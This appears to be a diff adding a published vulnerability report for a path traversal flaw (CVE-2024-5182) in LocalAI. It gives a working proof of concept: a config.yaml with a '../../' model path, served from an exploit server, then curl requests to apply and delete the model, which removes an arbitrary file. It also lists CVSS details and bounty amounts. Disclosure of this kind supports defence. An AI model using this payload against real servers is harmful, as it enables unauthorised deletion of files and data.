@@ -1,0 +1,47 @@
+Title: Path Traversal in mudler/localai
+
+Proof of Concept: 
+For testing, create a file named deleteme.txt in the /tmp folder.
+
+Save the following code as config.yaml.
+
+name: "delete_test"
+parameters:
+  model: ../../../../../../../../tmp/deleteme.txt
+
+usage: |
+    foo
+
+Start a python http server:  python3 -m http.server
+
+Add a model.
+curl http://localhost:8080/models/apply -X POST -H "Content-Type: application/json" -d '{"config_url":"<exploit_server>/config.yaml","id":""}'
+
+The model name is the md5 hash of config_url, use this command to calculate this value: echo -n "<exploit_server>/config.yaml" | md5sum
+
+Delete model
+curl http://localhost:8080/models/delete/f26ecc271c5e79202b71619382c0c22b -X POST
+
+When the process is completed, you will see that the file has been deleted.
+
+Impact: 
+Sensitive data can be deleted.
+
+CVE ID: CVE-2024-5182
+Status: (published)
+Vulnerability Type: CWE-22: Path Traversal
+Severity: High (7.5)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: None
+Integrity: None
+Availability: High
+Registry: Golang
+Affected Version: 2.14.0
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $450
+Fix Bounty: $112.5
